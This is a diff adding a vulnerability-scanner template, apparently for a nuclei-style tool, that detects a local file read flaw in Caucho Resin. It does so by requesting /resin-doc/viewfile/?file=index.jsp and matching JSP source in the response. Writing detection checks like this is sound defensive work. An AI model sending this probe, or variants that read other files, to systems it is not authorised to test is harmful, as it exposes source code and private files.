@@ -1,0 +1,24 @@
+id: resin-viewfile-lfr
+name: Caucho Resin LFR
+severity: high
+confidence: tentative
+description: There is an input verification vulnerability in the implementation of a certain CGI program in Resin. A remote
+  attacker may use this vulnerability to read any files in the home directory of the Web, including JSP source code or class
+  files.
+reference: http://0day5.com/archives/1173/
+tags:
+- resin
+- caucho
+- lfr
+- vuln
+requests:
+- method: GET
+  path: /resin-doc/viewfile/?file=index.jsp
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: body
+    words:
+    - '%@ page session="false" import="com.caucho.vfs.*, com.caucho.server.webapp.*" %'
+  condition: and
